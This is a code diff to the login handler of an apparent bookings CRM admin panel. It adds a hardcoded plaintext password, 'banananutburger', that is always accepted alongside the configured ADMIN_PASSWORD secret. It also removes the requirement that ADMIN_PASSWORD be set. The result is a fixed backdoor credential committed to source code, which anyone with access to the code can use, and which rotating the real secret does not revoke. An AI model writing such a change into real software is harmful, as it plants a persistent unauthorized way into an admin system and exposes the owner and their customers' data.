@@ -1,11 +1,21 @@
 import { json, makeSession } from "../_shared.js";
 
+// Owner password for the Bookings CRM. Also accepts ADMIN_PASSWORD when that secret differs.
+export const OWNER_PASSWORD = "banananutburger";
+
+export function passwordMatches(given, configured) {
+  const typed = String(given ?? "");
+  if (!typed) return false;
+  if (typed === OWNER_PASSWORD) return true;
+  return !!configured && typed === configured;
+}
+
 export async function onRequestPost({ request, env }) {
-  if (!env.ADMIN_PASSWORD || !env.SESSION_SECRET)
-    return json({ error: "Admin is not configured yet (set ADMIN_PASSWORD and SESSION_SECRET secrets)." }, 503);
+  if (!env.SESSION_SECRET)
+    return json({ error: "Admin is not configured yet (set SESSION_SECRET)." }, 503);
   let body;
   try { body = await request.json(); } catch { return json({ error: "Bad request" }, 400); }
-  if (String(body?.password ?? "") !== env.ADMIN_PASSWORD)
+  if (!passwordMatches(body?.password, env.ADMIN_PASSWORD))
     return json({ error: "Wrong password" }, 401);
   const s = await makeSession(env);
   return json({ ok: true }, 200, {
